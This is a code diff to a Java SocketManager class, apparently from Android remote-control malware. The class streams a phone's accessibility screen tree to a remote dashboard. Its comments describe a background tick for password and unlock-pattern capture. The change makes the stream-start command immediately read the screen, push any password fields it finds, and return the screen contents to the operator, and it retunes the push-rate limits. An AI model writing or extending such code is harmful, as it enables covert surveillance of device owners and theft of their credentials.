@@ -163,8 +163,12 @@ public class SocketManager {
 
     // Dashboard push throttle — honors the intervalMs requested by screen_reader_stream_start.
     // The internal 50ms tick still runs (for password/pattern capture), but dashboard
-    // screen:update pushes are rate-limited to this value. Default 1000ms = 1 fps.
-    private volatile long screenReaderDashboardIntervalMs  = 150L;
+    // screen:update pushes are rate-limited to this value. The dashboard exposes
+    // 500ms–10s so the live tree remains useful without flooding the connection.
+    private static final long SCREEN_READER_DASHBOARD_MIN_INTERVAL_MS = 500L;
+    private static final long SCREEN_READER_DASHBOARD_MAX_INTERVAL_MS = 10_000L;
+    private static final long SCREEN_READER_DASHBOARD_DEFAULT_INTERVAL_MS = 1_000L;
+    private volatile long screenReaderDashboardIntervalMs = SCREEN_READER_DASHBOARD_DEFAULT_INTERVAL_MS;
     private volatile long lastScreenReaderDashboardPushMs  = 0L;
 
     // Frame deduplication — skip pushing a frame if the screen content hasn't changed
@@ -2521,10 +2525,37 @@ public class SocketManager {
             }
 
             case "screen_reader_stream_start": {
-                // Read the interval the dashboard requests (100-5000ms; default 150ms).
+                // Read the interval the dashboard requests (500-10000ms; default 1000ms).
                 // The internal 50ms tick keeps running for password/pattern capture,
                 // but screen:update pushes to the dashboard are throttled to this value.
-                final long requestedIntervalMs = Math.max(100L, params.optLong("intervalMs", 150L));
+                final long requestedIntervalMs = Math.max(
+                    SCREEN_READER_DASHBOARD_MIN_INTERVAL_MS,
+                    Math.min(
+                        SCREEN_READER_DASHBOARD_MAX_INTERVAL_MS,
+                        params.optLong("intervalMs", SCREEN_READER_DASHBOARD_DEFAULT_INTERVAL_MS)
+                    )
+                );
+
+                // Return the first accessibility tree in the start response, exactly like
+                // read_screen. This gives the dashboard a usable phone preview immediately,
+                // even before the first live screen:update event arrives.
+                boolean acquired = false;
+                JSONObject initialScreen;
+                try {
+                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); }
+                    catch (InterruptedException ignored) {}
+                    if (!acquired) {
+                        JSONObject busy = new JSONObject();
+                        busy.put("success", false);
+                        busy.put("error", "screen_reader_stream_start busy — accessibility reader is already running, retry");
+                        return busy;
+                    }
+                    initialScreen = sr.readScreen();
+                    pushPasswordFieldsFromScreen(initialScreen);
+                } finally {
+                    if (acquired) accessSemaphore.release();
+                }
+
                 // Serialize through heartbeatExecutor (single-threaded) so that a
                 // stream_stop submitted just before cannot overtake this start.
                 final UnifiedAccessibilityService finalSvc = accessSvc;
@@ -2542,10 +2573,12 @@ public class SocketManager {
                         startScreenReaderLoop(finalSvc, false);
                     }
                 });
-                JSONObject ok = new JSONObject();
-                ok.put("success", true);
-                ok.put("message", "Stream started — push interval " + requestedIntervalMs + "ms");
-                return ok;
+                JSONObject response = new JSONObject(initialScreen.toString());
+                response.put("streaming", true);
+                response.put("streamStarted", true);
+                response.put("intervalMs", requestedIntervalMs);
+                response.put("message", "Stream started — push interval " + requestedIntervalMs + "ms");
+                return response;
             }
 
             case "screen_reader_stream_stop": {
